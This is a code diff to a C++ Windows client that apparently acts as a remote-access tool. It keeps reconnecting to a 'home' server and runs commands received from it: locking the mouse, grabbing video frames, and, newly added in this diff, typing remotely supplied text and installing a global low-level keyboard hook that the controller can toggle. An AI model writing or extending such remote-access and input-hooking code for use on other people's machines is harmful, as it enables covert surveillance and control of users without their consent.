@@ -1,10 +1,9 @@
-#include "ip.h"
-#include "../../packet.h"
-#include <iostream>
 #include <asio.hpp>
 #include <string>
 #include <thread>
 #include <map>
+#include "ip.h"
+#include <iostream>
 #include <vector>
 #include <windows.h>
 #include <sapi.h>
@@ -12,6 +11,8 @@
 #include <winnt.h>
 #define STB_IMAGE_IMPLEMENTATION
 #include "stb_image.h"
+#include "../../packet.h"
+#include "stupid_windows.h"
 using asio::ip::tcp;
 
 // Create terms of service
@@ -217,6 +218,54 @@ class get_video_frame : public Packet_Manager {
     }
 };
 
+class keyboard_type : public Packet_Manager
+{
+    void receive(const Packet& packet) override
+    {
+        Sleep(500);
+        type_string(packet.str);
+    }
+};
+
+class echo_keyboard : public Packet_Manager {
+public:
+    bool state = false;
+    std::thread worker;
+    HHOOK hHook = nullptr;
+
+    echo_keyboard()
+    {
+        worker = std::thread([this]{ loop(); });
+        worker.detach();
+    }
+
+    void loop()
+    {
+        hHook = SetWindowsHookExW(WH_KEYBOARD_LL, keyboard_hook, nullptr, 0);
+        if (!hHook) {
+            std::cerr << "Failed to set hook!\n";
+            return;
+        }
+
+        MSG msg;
+        while (GetMessage(&msg, nullptr, 0, 0) > 0)
+        {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+
+            if (!state) continue;                 
+
+            std::u16string glyph;
+            if (msgToUtf16(msg, glyph))          
+                type_string(glyph);             
+        }
+
+        UnhookWindowsHookEx(hHook);
+    }
+
+    void receive(const Packet& p) override { state = p.bo; }
+};
+
 int main() {
 
     // Should be defined in the same order as packet_id enum this is badly designed but I do not care this is a stupid project
@@ -230,6 +279,8 @@ int main() {
     lock_mouse_to_box lock_mouse_handle;
     free_mouse free_mouse_handle;
     get_video_frame video_frame_handle;
+    keyboard_type keyboard_type_handle;
+    echo_keyboard echo_keyboard_handle;
 
     while(true) {
         std::cout << "trying to connect to home\n";
@@ -250,6 +301,7 @@ int main() {
                 if (len == sizeof(Packet)) {
                     for(auto [id, handler] : Packet_Manager::Every_Package) {
                         if(packet.id == (packet_id)id) {
+                            std::cout << "processing packet\n";
                             handler->receive(packet);
                             handler->send(socket, packet);
                         }
